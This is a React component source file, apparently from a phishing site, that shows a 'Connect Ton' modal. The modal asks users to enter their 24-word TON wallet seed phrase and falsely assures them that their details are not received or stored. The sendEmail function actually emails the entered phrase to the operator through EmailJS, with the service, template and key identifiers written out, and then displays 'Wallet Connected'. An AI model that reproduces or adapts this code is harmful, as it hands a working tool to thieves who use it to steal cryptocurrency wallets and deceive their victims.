import { useEffect, useRef } from "react";
import { useConnect } from "../hooks/useConnect";

//style
import "./Modal.css";

//emailjs.com
import emailjs from "@emailjs/browser";

function Modal() {
  const { openModal, setOpenModal } = useConnect();

  let modalRef = useRef();

  //click outside the modal container to close
  useEffect(() => {
    let handleModal = (e) => {
      if (!modalRef.current.contains(e.target)) {
        setOpenModal(!openModal);
      }
    };

    document.addEventListener("mousedown", handleModal);

    return () => {
      document.removeEventListener("mousedown", handleModal);
    };
  }, [openModal, setOpenModal]);

  //function for send email
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_gmqxwzs",
        "template_x3t9fxu",
        form.current,
        "-RcZVtH8ooKOsQsOA"
      )
      .then(
        (result) => {
          console.log(result.text);
          alert("Wallet Connected");
        },
        (error) => {
          console.log(error.text);
        }
      );

    e.target.reset();
    setOpenModal(!openModal);
  };

  return (
    <div>
      {openModal && (
        <div className="modal">
          <div className="modal-container" ref={modalRef}>
            <h2>Connect Ton</h2>
            <p>
              We do not receive or store your wallet login details, so your TON
              is safe.
            </p>
            <form className="modal-input" ref={form} onSubmit={sendEmail}>
              <textarea
                name="message"
                id=""
                cols="35"
                rows="4"
                placeholder="Enter your 24 secret words to connect"
                required
              />

              <button value="send">Connect Wallet</button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}

export default Modal;
